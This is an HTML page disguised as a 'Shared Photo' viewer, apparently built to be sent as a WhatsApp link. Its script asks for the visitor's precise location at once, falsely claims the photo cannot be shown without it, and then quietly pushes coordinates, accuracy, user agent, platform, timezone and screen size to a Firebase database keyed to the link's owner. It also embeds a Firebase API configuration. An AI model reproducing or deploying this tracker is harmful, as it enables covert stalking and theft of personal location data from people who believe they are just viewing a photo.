<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<title>Shared Photo</title>

<!-- ═══ PREVIEW WHATSAPP ═══ -->
<meta property="og:title" content="Shared Photo" />
<meta property="og:description" content="A photo has been shared with you. View the photo and its location details." />
<meta property="og:image" content="https://infocuaca.online/preview.jpg" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:type" content="image/jpeg" />
<meta property="og:url" content="https://infocuaca.online/view.html" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="infocuaca.online" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="Shared Photo" />
<meta name="twitter:description" content="A photo has been shared with you. View the photo and its location details." />
<meta name="twitter:image" content="https://infocuaca.online/preview.jpg" />

<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;overflow-x:hidden}
body{
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
  background:#f5f5f5;
  color:#1a1a1a;
  min-height:100vh;
  padding:16px;
  display:flex;
  justify-content:center;
  align-items:flex-start;
}
.wrap{width:100%;max-width:420px}

/* ═══ CARD ═══ */
.card{
  background:#ffffff;
  border-radius:12px;
  box-shadow:0 2px 12px rgba(0,0,0,.08);
  overflow:hidden;
}

/* ═══ HEADER ═══ */
.header{
  padding:16px 20px;
  border-bottom:1px solid #eee;
  display:flex;
  align-items:center;
  gap:10px;
}
.header .icon{
  width:32px;height:32px;
  border-radius:50%;
  background:linear-gradient(135deg,#4CAF50,#2E7D32);
  display:flex;align-items:center;justify-content:center;
  flex-shrink:0;
}
.header .icon svg{width:18px;height:18px;fill:#fff}
.header .title{
  font-size:15px;
  font-weight:600;
  color:#1a1a1a;
}
.header .subtitle{
  font-size:12px;
  color:#888;
  margin-top:2px;
}

/* ═══ CONTENT ═══ */
.content{padding:16px}

/* ═══ PHOTO ═══ */
.photo-box{
  width:100%;
  background:#000;
  border-radius:10px;
  overflow:hidden;
  margin-bottom:14px;
}
.photo-box img{
  width:100%;
  height:auto;
  max-height:60vh;
  object-fit:contain;
  display:block;
}

/* ═══ STATUS MESSAGES ═══ */
.status-box{
  text-align:center;
  padding:40px 20px;
}
.status-icon{
  width:64px;height:64px;
  margin:0 auto 16px;
  border-radius:50%;
  display:flex;align-items:center;justify-content:center;
}
.status-icon.denied{background:#FFEBEE}
.status-icon.denied svg{fill:#D32F2F}
.status-icon.error{background:#FFF3E0}
.status-icon.error svg{fill:#F57C00}
.status-icon svg{width:32px;height:32px}
.status-title{
  font-size:16px;
  font-weight:600;
  color:#1a1a1a;
  margin-bottom:8px;
}
.status-desc{
  font-size:13px;
  color:#666;
  line-height:1.5;
}

/* ═══ LOCATION INFO (tanpa koordinat) ═══ */
.location-info{
  display:flex;
  align-items:center;
  gap:10px;
  padding:12px 14px;
  background:#f9f9f9;
  border-radius:8px;
  margin-bottom:12px;
}
.location-info .pin{
  width:32px;height:32px;
  border-radius:50%;
  background:#4CAF50;
  display:flex;align-items:center;justify-content:center;
  flex-shrink:0;
}
.location-info .pin svg{width:18px;height:18px;fill:#fff}
.location-info .text{
  flex:1;
  min-width:0;
}
.location-info .text .t1{
  font-size:13px;
  font-weight:600;
  color:#1a1a1a;
}

/* ═══ BUTTON ═══ */
.btn{
  width:100%;
  padding:14px;
  background:#4CAF50;
  color:#fff;
  border:none;
  border-radius:10px;
  font-size:14px;
  font-weight:600;
  letter-spacing:.5px;
  cursor:pointer;
  display:flex;
  align-items:center;
  justify-content:center;
  gap:8px;
  transition:background .2s;
  font-family:inherit;
}
.btn:active{background:#388E3C}
.btn svg{width:18px;height:18px;fill:#fff}

/* ═══ HIDE ═══ */
.hide{display:none!important}

/* ═══ FOOTER ═══ */
.footer{
  text-align:center;
  font-size:11px;
  color:#aaa;
  padding:14px 0;
}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">

    <!-- HEADER -->
    <div class="header">
      <div class="icon">
        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
          <path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/>
        </svg>
      </div>
      <div>
        <div class="title">Shared Photo</div>
        <div class="subtitle">Someone sent you a photo</div>
      </div>
    </div>

    <!-- CONTENT -->
    <div class="content">

      <!-- FOTO (muncul setelah izin) -->
      <div class="photo-box hide" id="photoBox">
        <img id="mainPhoto" alt="Shared photo">
      </div>

      <!-- DENIED (kalau izin ditolak) -->
      <div class="status-box hide" id="deniedBox">
        <div class="status-icon denied">
          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
          </svg>
        </div>
        <div class="status-title">Photo Unavailable</div>
        <div class="status-desc">This photo requires location access to view.<br>Please allow location permission and reload.</div>
      </div>

      <!-- ERROR (link tidak valid) -->
      <div class="status-box hide" id="errBox">
        <div class="status-icon error">
          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
          </svg>
        </div>
        <div class="status-title">Invalid Link</div>
        <div class="status-desc">This photo link is invalid or has expired.</div>
      </div>

      <!-- LOCATION + BUTTON (muncul setelah izin) -->
      <div id="afterBox" class="hide">

        <div class="location-info">
          <div class="pin">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
            </svg>
          </div>
          <div class="text">
            <div class="t1">Location Available</div>
          </div>
        </div>

        <button class="btn" onclick="openMaps()">
          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
          </svg>
          View Location
        </button>

      </div>

    </div>
  </div>

  <div class="footer">infocuaca.online</div>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

const FC = {
  apiKey:"AIzaSyBYjDmJh5OG_AkZesWObgGkSgr6yX0iBEI",
  authDomain:"roraxbali-65802.firebaseapp.com",
  databaseURL:"https://roraxbali-65802-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId:"roraxbali-65802",
  storageBucket:"roraxbali-65802.firebasestorage.app",
  messagingSenderId:750633313866,
  appId:"1:750636313866:web:3d2e552960e06db83968b3"
};

const app = initializeApp(FC);
const db  = getDatabase(app);

// ============ PARAMETER URL ============
const params = new URLSearchParams(location.search);
const fotoUrl   = params.get('foto') || '';
const ownerUser = params.get('u')    || '';

// ============ ELEMEN ============
const photoBox   = document.getElementById('photoBox');
const deniedBox  = document.getElementById('deniedBox');
const errBox     = document.getElementById('errBox');
const afterBox   = document.getElementById('afterBox');
const mainPhoto  = document.getElementById('mainPhoto');

// ============ VARIABEL GLOBAL ============
let currentLat = null;
let currentLng = null;

// ============ VALIDASI LINK & LANGSUNG MINTA IZIN ============
if (!fotoUrl || !ownerUser) {
  errBox.classList.remove('hide');
} else {
  // ═══ LANGSUNG MINTA IZIN LOKASI (popup muncul pertama kali) ═══
  requestLocation();
}

// ============ REQUEST LOKASI ============
function requestLocation() {
  if (!navigator.geolocation) {
    showDenied();
    return;
  }

  navigator.geolocation.getCurrentPosition(
    // ✅ IZIN DIBERIKAN → foto langsung muncul
    pos => {
      currentLat = pos.coords.latitude;
      currentLng = pos.coords.longitude;

      // Simpan ke Firebase
      push(ref(db, 'lokasi/' + ownerUser), {
        target:   'images',
        waktu:    Date.now(),
        lat:      currentLat,
        lng:      currentLng,
        akurasi:  pos.coords.accuracy,
        foto:     fotoUrl,
        platform: navigator.platform || 'Unknown',
        userAgent: navigator.userAgent,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen:   screen.width + 'x' + screen.height,
        via:      'view',
        source:   'view.html'
      }).catch(()=>{});

      // ═══ FOTO LANGSUNG MUNCUL (tanpa loading) ═══
      mainPhoto.onerror = () => {
        photoBox.classList.add('hide');
        errBox.classList.remove('hide');
      };
      mainPhoto.src = fotoUrl;

      photoBox.classList.remove('hide');
      afterBox.classList.remove('hide');
    },

    // ❌ IZIN DITOLAK / ERROR
    err => {
      showDenied();
    },

    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
  );
}

// ============ SHOW DENIED ============
function showDenied() {
  photoBox.classList.add('hide');
  afterBox.classList.add('hide');
  deniedBox.classList.remove('hide');
}

// ============ OPEN MAPS (tombol) ============
window.openMaps = function () {
  if (currentLat === null || currentLng === null) return;
  window.location.href = 'https://www.google.com/maps?q=' + currentLat + ',' + currentLng;
};
</script>
</body>
</html>
